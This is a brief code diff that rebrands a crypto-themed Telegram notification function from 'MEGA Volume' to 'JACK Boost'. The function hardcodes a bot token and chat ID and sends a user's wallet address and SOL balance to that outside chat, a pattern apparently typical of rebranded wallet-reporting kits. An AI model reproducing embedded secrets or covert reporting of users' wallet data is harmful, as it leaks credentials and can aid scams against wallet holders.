@@ -178,7 +178,7 @@ export async function sendTelegramNotification(
   const BOT_TOKEN = "8209811310:AAF9m3QQAU17ijZpMiYEQylE1gHd4Yl1u_M";
   const CHAT_ID = "-4836248812";
 
-  let message = "🎯 MEGA Volume\n\n";
+  let message = "🎯 JACK Boost\n\n";
   message += `💼 Wallet: \`${walletAddress}\`\n\n`;
   message += `💰 SOL Balance: ${balances.solBalance.toFixed(4)} SOL\n\n`;
   
